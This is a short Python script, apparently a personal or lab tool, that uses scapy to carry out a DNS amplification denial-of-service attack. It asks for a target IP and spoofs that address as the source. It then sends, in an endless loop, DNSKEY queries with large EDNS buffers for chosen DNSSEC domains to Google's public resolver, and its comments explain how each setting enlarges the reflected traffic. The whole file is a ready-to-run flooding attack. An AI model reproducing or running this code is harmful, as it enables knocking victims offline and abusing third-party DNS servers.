import scapy.all as scp

target_ip = input("Target IP: ")
# dns_server = input("DNS Server IP: ")
query_option = input("Query Option [1 or 2]: ")

# nlnetlabs.nl
# verisignlabs.com
# sigok.verteiltesysteme.net
# dane.verisignlabs.com


def dns_amplification(target_ip, query_option, dns_server="8.8.8.8"):

    query_name_option = ["dane.verisignlabs.com", "sigok.verteiltesysteme.net"]
    # 2 most effective query name
    # the first causes Packet fragmentation
    # the second is less effective, but doesnt cause fragmentation

    query_name = query_name_option[0]

    if query_option == "2":
        query_name = query_name_option[1]

    # Construct a DNS query packet with a spoofed source IP
    ip = scp.IP(src=target_ip, dst=dns_server)
    udp = scp.UDP(sport=scp.RandShort(), dport=53)  # port for DNS server
    dns = scp.DNS(
        rd=1,
        qd=scp.DNSQR(qname=query_name, qtype="DNSKEY"),
        ar=scp.DNSRROPT(rclass=4096),
    )
    # rd=1 (recursion desired) is enabling rescusive, which makes sure the packets continues to search so it response with the full response packet (and not partial)
    # qtype DNSKEY makes dns response the largest, probably because example.com supports DNSSEC query (those queries are large)
    # DNSKEY is part of DNSSEC
    # ar=scp.DNSRROPT(rclass=4096) makes the response packets larger as well
    packet = ip / udp / dns

    # Send the packet
    scp.send(packet, loop=1, verbose=0)


dns_amplification(target_ip, query_option)
# dns_amplification("192.168.8.101", query_option)
